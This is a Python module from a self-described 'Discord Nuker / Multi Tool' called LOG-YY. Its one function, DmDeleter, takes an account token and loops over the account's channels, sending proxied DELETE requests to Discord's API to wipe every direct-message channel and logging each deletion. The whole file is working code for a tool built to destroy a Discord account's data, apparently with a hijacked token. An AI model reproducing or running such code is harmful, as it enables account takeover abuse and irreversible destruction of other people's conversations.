# Developper : waltta#6821 | 
# LOG-YY Discord Nuker / Multi Tool©
# Copyright © 2022 waltta#6821 
# Copyright © LOG-YY-Nuke
######################################################### 


import requests
from colorama import Fore

from utilities.Settings.common import *

def DmDeleter(token, channels):
    for channel in channels:
        try:
            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
            proxies=proxy(),
            headers=getheaders(token))
            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted DM: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"\nERROR | {e}")